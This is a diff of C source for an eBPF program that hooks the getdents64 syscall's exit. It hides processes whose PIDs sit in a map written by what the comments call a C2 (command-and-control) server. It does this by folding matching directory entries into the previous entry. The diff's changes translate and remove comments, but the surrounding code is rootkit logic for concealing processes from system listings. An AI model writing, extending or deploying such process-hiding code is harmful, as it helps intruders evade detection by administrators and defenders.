@@ -15,7 +15,7 @@ char _metadata[] __attribute__((used, section(".metadata"))) =
         "\"target\":[\"0\",\"Target PID to hide immediately upon loading\"]"
       "},"
       "\"maps\":{"
-        // 与你的 agent.c 和 console.py 完美对应：8 字节的字符串 Key！
+        // Perfectly corresponds to agent.c and console.py: 8-byte string Key!
         "\"target\":{\"key_size\":8,\"value_size\":4,\"key_type\":\"u64\",\"value_type\":\"u32\"}"
       "}"
     "}";
@@ -23,7 +23,7 @@ char _metadata[] __attribute__((used, section(".metadata"))) =
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 64);
-    __type(key, u64); // 8 字节字符串
+    __type(key, u64); // 8-byte string
     __type(value, u32);
 } target SEC(".maps");
 
@@ -72,20 +72,10 @@ int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx) {
         long err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
             dirp + offset + offsetof(struct linux_dirent64, d_reclen));
         if (err != 0 || d_reclen == 0) break;
-
-        // 降维打击的核心：直接把目录名当成 8 字节内存块读出来
         char d_name[8] = {}; 
-        
-        // 2. 读取字符串。它遇到 \0 就会自动停止！剩下的字节完美保持为 0！
         bpf_probe_read_user_str(d_name, sizeof(d_name),
             dirp + offset + offsetof(struct linux_dirent64, d_name));
-
-        // 3. 把这块洗干净的、带 \0 填充的内存，直接强制转换为 u64
         u64 raw_name_str = *(u64 *)d_name;
-
-        // 此时，raw_name_str 里的内容就是 "58795\0\0\0"
-        // 你的 C2 写入 Map 的也是 "58795\0\0\0"
-        // 它们会在这里完美邂逅！
         if (bpf_map_lookup_elem(&target, &raw_name_str)) {
             if (prev_offset >= 0) {
                 unsigned short new_reclen = prev_reclen + d_reclen;
